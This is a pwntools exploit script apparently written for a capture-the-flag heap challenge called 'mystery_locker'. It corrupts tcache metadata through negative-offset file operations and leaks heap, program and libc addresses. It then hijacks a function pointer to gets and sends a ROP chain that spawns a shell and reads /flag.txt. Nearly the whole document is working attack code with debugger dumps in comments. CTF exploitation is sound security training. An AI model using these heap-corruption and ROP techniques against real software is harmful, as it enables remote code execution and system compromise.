#!/usr/bin/env python3
# -*- coding: utf-8 -*-


from pwn import *

elf = context.binary = ELF('mystery_locker', checksec=True)
libc = ELF('./libc.so.6')

# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]


def get_conn(argv=[], *a, **kw):
	host = args.HOST or ''
	port = int(args.PORT or 1337)
	if args.GDB:
		os.system(f"rm -rf -- {env['FS_PATH']}")
		return gdb.debug([elf.path] + argv, gdbscript=gdbscript, env=env, *a, **kw)
	elif args.REMOTE:
		return remote(host, port)
	else:
		os.system(f"rm -rf -- {env['FS_PATH']}")
		return process([elf.path] + argv, env=env, *a, **kw)

gdbscript = '''
# b *delete_file+135
# b delete_file
# b create_file
b stop

continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
env = {'FS_PATH':'fs/'}

io = get_conn()
r = lambda x: io.recv(x)
rl = lambda: io.recvline(keepends=False)
ru = lambda x: io.recvuntil(x, drop=True)
cl = lambda: io.clean(timeout=1)
s = lambda x: io.send(x)
sa = lambda x, y: io.sendafter(x, y)
sl = lambda x: io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
ia = lambda: io.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)


def create(fname_size, fname, contents_len, contents):
	li(f'create({fname_size}, {fname}, {contents_len}, {contents})')
	sla(b'> ', b'0')
	sla(b'fname size: ', str(fname_size).encode())
	sa(b'fname: ', fname)
	sla(b'contents len: ', str(contents_len).encode())
	sa(b'contents: ', contents)

def rename(fname_size, fname, new_fname_size, new_fname):
	li(f'create({fname_size}, {fname}, {new_fname_size}, {new_fname})')
	sla(b'> ', b'1')
	sla(b'fname size: ', str(fname_size).encode())
	sa(b'fname: ', fname)
	sla(b'new fname size: ', str(new_fname_size).encode())
	sa(b'new fname: ', new_fname)

def show(fname_size, fname):
	li(f'print({fname_size}, {fname})')
	sla(b'> ', b'2')
	sla(b'fname size: ', str(fname_size).encode())
	sa(b'fname: ', fname)
	return ru(b'Contents len')

def delete(fname_size, fname):
	li(f'delete({fname_size}, {fname})')
	sla(b'> ', b'3')
	sla(b'fname size: ', str(fname_size).encode())
	sa(b'fname: ', fname)

def exit():
	li(f'exit()')
	sla(b'> ', b'4')

def protect_ptr(pos, ptr):
	return (pos >> 12) ^ ptr

li("clean up fs")

temp_chunks = []
li("spawning some temp chunks")
for i in range(0x30):
	fname = f'tmp{i}'.encode()
	temp_chunks.append(fname)
	create(len(fname), fname, 0x100, b'X\x00')

li("prepare chunks for overlap")
fname = f'file0'.encode()
create(len(fname), fname, 0x100, b'X\x00')

fname = f'file1'.encode()
create(len(fname), fname, 0x80, b'X\x00')

fname = f'file2'.encode()
create(len(fname), fname, 0x200, b'X\x00')


li("leaking heap addr")

# modify last byte of chunk ptr in heap struct, so we can leak contents of some other chunk
delete(-0x518, b'\x00')

# trigger leak
create(5, b'leak0', 0x80, b'\x00')
leak_heap = show(5, b'leak0')
ls(f'leak: {leak_heap}')
heap_base = u64(leak_heap.ljust(8, b'\x00')) << 12
ls(f'heap_base {heap_base:#x}')

# clear tcache count for tcache[0x90], so it won't kick us in the ass later
delete(-0xab2, b'\x00')


li("leaking program base")

create(8, b'aligner0', 0xc0, b'\x00')
create(11, b'heap_struct', 0x2e0, b'\x00')

# 0x5640f28811e0	0x0000000000000000	0x0000000000000000	................
# 0x5640f28811f0	0x0000000000000000	0x00005640f28836b0	.........6..@V..
# 0x5640f2881200	0x0000000000000000	0x0000000000000000	................

li("nulling out msbs of tcache[0x2f0]")

for i in range(7):
	fname = temp_chunks.pop()
	delete(-0x10a7+i, fname + b'\x00')

# 0x5640f28811e0	0x0000000000000000	0x0000000000000000	................
# 0x5640f28811f0	0x0000000000000000	0x00000000000000b0	................
# 0x5640f2881200	0x0000000000000000	0x0000000000000000	................

# set tcache[0x110] to point to freshly crafted chunk
fname = temp_chunks.pop()
delete(-0x1198, fname + b'\x00')

# prepare chunk for nulling out the tcache[0x410]
create(4, b'temp', 0xd0, flat(b'A' * (0xa0), b'\x00'))

# allocate new chunk, do not overwrite pointer on heap
create(5, b'leak1', 0x100, flat(b'X' * 0xa0, b'\x00'))

leak_binary = show(5, b'leak1')
ls(f'leak_binary: {leak_binary}')
leak_binary = leak_binary.replace(b'X', b'')
binary_base = u64(leak_binary.ljust(8, b'\x00')) - 0x1db4 # elf.symbols['stop']
ls(f'binary_base {binary_base:#x}')
elf.address = binary_base

# consume one chunk from tcache[0xb0]
fname = temp_chunks.pop()
delete(0xa0, fname + b'\x00')

# clear tcache
show(4, b'temp')

# fix tcache[0x410]
create(5, b'fixer', 0xa0, flat(b'X' * 0x88, p64(heap_base + 0x690).strip(b'\x00'), b'\x00'))

li("leaking addr of stdout (libc)")

# 0xb0 [  2]: 0x55f84b5aaaa0 —▸ 0x55f84b5a8200 ◂— 0x0
# use fact that second entry of tcache[0xb0] is still pointing to tcache_perthread_struct

# make tcache[0x360] to have one entry
fname = temp_chunks.pop()
delete(0x350, fname + b'\x00')

# overwrite tcache[0x360] ptr (it has one entry because we set it before)
target_addr = elf.bss() - 0xe0
fname = b'A' * 0x30 + p64(target_addr).strip(b'\x00') + b'\x00'
create(11, b'overwriter0', 0xa0, fname)

# make tcache[0x350] to have one entry
fname = temp_chunks.pop()
delete(0x340, fname + b'\x00')

# overwrite tcache[0x350] ptr (it has one entry because we set it before)
# (this will be needed for leaking libc)
target_addr = elf.bss() - 0x30
fname = b'A' * 0x28 + p64(target_addr).strip(b'\x00') + b'\x00'
create(11, b'overwriter1', 0xa0, fname)

# tcachebins
# 0x20 [  2]: 0x5592a9f58ab0 —▸ 0x5592a9f582d0 ◂— 0x0
# 0x90 [  0]: 0x5592a9f58400 ◂— ...
# 0xb0 [  1]: 0x5592a9f58200 ◂— 0x0
# 0xd0 [  1]: 0x5592a9f58ee0 ◂— 0x0
# 0xe0 [  1]: 0x5592a9f596b0 ◂— 0x0
# 0x110 [  0]: 0x5592a9f58
# 0x210 [  1]: 0x5592a9f58400 ◂— 0x0
# 0x2f0 [  1]: 0xb0
# 0x300 [  0]: 0x5592a9f58
# 0x310 [  0]: 0x4786036b3a10fbdb
# 0x320 [  0]: 0x4141414141414141 ('AAAAAAAA')
# 0x330 [  0]: 0x4141414141414141 ('AAAAAAAA')
# 0x340 [  0]: 0x4141414141414141 ('AAAAAAAA')
# 0x350 [  1]: 0x5592a8bd2230 (PADDING+16) ◂— 0x5592a8bd2
# 0x360 [  1]: 0x5592a8bd2180 (K+96) ◂— 0xc33707d378cb4634


# pwndbg> dq 0x55f84af52180-0x10
# 000055f84af52170     02441453d62f105d e7d3fbc8d8a1e681
# 000055f84af52180     c33707d621e1cde6 455a14edf4d50d87
# 000055f84af52190     fcefa3f8a9e3e905 8d2a4c8a676f02d9
# 000055f84af521a0     8771f681fffa3942 fde5380c6d9d6122
# 000055f84af521b0     4bdecfa9a4beea44 bebfbc70f6bb4b60
# 000055f84af521c0     eaa127fa289b7ec6 04881d05d4ef3085
# 000055f84af521d0     e6db99e5d9d4d039 c4ac56651fa27cf8
# 000055f84af521e0     432aff97f4292244 fc93a039ab9423a7
# 000055f84af521f0     8f0ccc92655b59c3 85845dd1ffeff47d
# 000055f84af52200     fe2ce6e06fa87e4f 4e0811a1a3014314
# 000055f84af52210     bd3af235f7537e82 eb86d3912ad7d2bb
# 000055f84af52220     0000000000000080 0000000000000000
# 000055f84af52230     0000000000000000 0000000000000000
# 000055f84af52240     0000000000000000 0000000000000000
# 000055f84af52250     0000000000000000 0000000000000000
# 000055f84af52260     00007effb3bf7780 0000000000000000


# we want to have
# 000055f84af52170     0000000000000000 0000000000000081
# instead of:
# 000055f84af52170     02441453d62f105d e7d3fbc8d8a1e681
# to ensure that chunk is valid and can be leaked easily (via create file)
# so we use null byte write to clear up necessary data

# 000055f84af52260 is the place with libc ptrs (stdout, stdin, stderr)

# clear tcache[0x410]
delete(-10, b'\x00')

li("preparing place for fake chunk")

used_chunks = 0
for i in range(0x10):
	if i == 8: continue # omit 0x81
	fname = temp_chunks.pop() # does not matter, because we are altering numbers used to calculate md5 hash - all files created before are unremovable now
	curr_chunk_addr = heap_base + 0x1e40
	curr_chunk_addr += used_chunks * 0x410  # previous chunk wasn't freed, so we need to move whole chunk
	target_addr = elf.bss() - 0xf0
	target_addr += i  # move to next byte
	li(f"curr: {curr_chunk_addr:#x} to: {target_addr:#x} off: {target_addr-curr_chunk_addr:#x}")
	delete(target_addr-curr_chunk_addr, fname + b'\x00')
	used_chunks += 1

li("place for fake chunk prepared")

# pwndbg> dq 0x5596d9094170
# 00005596d9094170     0000000000000000 0000000000000081
# 00005596d9094180     c33707d621e1cde6 455a14edf4d50d87
# 00005596d9094190     fcefa3f8a9e3e905 8d2a4c8a676f02d9
# 00005596d90941a0     8771f681fffa3942 fde5380c6d9d6122

fname = b'leak_libc0'
create(len(fname), fname, 0x350, flat(b'\xf1' * 0xe0, b'\x00'))

# pwndbg> dq 0x5633f9b81180 0x20
# 000055e52aa8b180     000000055e52aa8b 91a4f7fe58114342
# 000055e52aa8b190     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 000055e52aa8b1a0     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 000055e52aa8b1b0     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 000055e52aa8b1c0     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 000055e52aa8b1d0     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 000055e52aa8b1e0     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 000055e52aa8b1f0     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 000055e52aa8b200     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 000055e52aa8b210     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 000055e52aa8b220     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 000055e52aa8b230     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 000055e52aa8b240     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 000055e52aa8b250     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 000055e52aa8b260     00007fc802df7780 0000000000000000
# 000055e52aa8b270     00007fc802df6aa0 0000000000000000

# now we have a chunk tcache[0x80] close to libc ptrs, but read_str writes null byte at the end of the chunk so strlen will stop early
# also md5 constants were changed so calculating of md5 uses different numbers

# here tcache[0x350] comes to play
# we can utilize it to create a chunk "closer" to libc, so null byte won't be written before libc pointers and strlen would be happy

# 000055e52aa8b220     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 000055e52aa8b230     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 000055e52aa8b240     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 000055e52aa8b250     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 000055e52aa8b260     00007fc802df7780 0000000000000000
# 000055e52aa8b270     00007fc802df6aa0 0000000000000000

# change 0xf bytes as we did before, to have proper chunk header
# 000055e52aa8b220     0000000000000000 00000000000000f1


li("preparing place for fake chunk 2")

used_chunks = 0
for i in range(0x10):
	if i == 8: continue # omit 0x81
	fname = temp_chunks.pop() # does not matter, because we are altering numbers used to calculate md5 hash - all files created before are unremovable now
	curr_chunk_addr = heap_base + 0x5b30
	curr_chunk_addr += used_chunks * 0x410  # previous chunk wasn't freed, so we need to move whole chunk
	target_addr = elf.bss() - 0x40
	target_addr += i  # move to next byte
	li(f"curr: {curr_chunk_addr:#x} to: {target_addr:#x} off: {target_addr-curr_chunk_addr:#x}")
	delete(target_addr-curr_chunk_addr, fname + b'\x00')
	used_chunks += 1

li("place for fake chunk 2 prepared")

# 0000557eac9d4220     0000000000000000 00000000000000f1
# 0000557eac9d4230     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 0000557eac9d4240     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 0000557eac9d4250     f1f1f1f1f1f1f1f1 f1f1f1f1f1f1f1f1
# 0000557eac9d4260     00007fd9cf3f7780 0000000000000000

# use tcache[0x350] which points to 0000557eac9d4230, but do not modify the data
fname = b'leak_libc1'
create(len(fname), fname, 0x340, flat(b'\xf1' * 0x30, b'\x00'))

# create a file with leaked libc address (md5 constants are still broken, but we will use the same constants for print operation)
fname = b'leak_libc2'
create(len(fname), fname, 0xe0, flat(b'\xf1' * 0x30, b'\x00'))

# print the file with leaked data
leak_libc = show(len(fname), fname)[0x30:]
ls(f'leak_libc: {leak_libc}')
libc_base = u64(leak_libc.ljust(8, b'\x00')) - 0x1f7780
ls(f'libc_base {libc_base:#x}')
libc.address = libc_base

# we have libc address, so it is possible to overwrite first function pointer (exit) on heap

# make tcache[0x360] to have one entry
create(8, b'new_temp', 0x350, b'\x00')


# reuse tcache[0xb0]
# point tcache[0x360] before stop ptr
fn_ptrs = heap_base + 0x280 
fname = b'A' * 0x30 + p64(fn_ptrs).strip(b'\x00') + b'\x00'
create(11, b'overwriter0', 0xa0, fname)

# overwrite stop ptr with gets
fname = b'A' * 0x20 + p64(libc.symbols['gets']).strip(b'\x00') + b'\x00'
delete(0x350, fname)

# trigger gets
exit()

# find ret addr offset
OFFSET = 1320
# sl(cyclic(0x600, n=8))

# run system('/bin/sh') and exit(0)
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = pop_rdi + 1
bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']
exit = libc.symbols['exit']

sl(flat(
	b'A' * OFFSET,
	ret,
	pop_rdi,
	bin_sh,
	system,
	pop_rdi,
	0,
	exit
))

sleep(1)
sl(b'ls;cat /flag.txt')

ia()
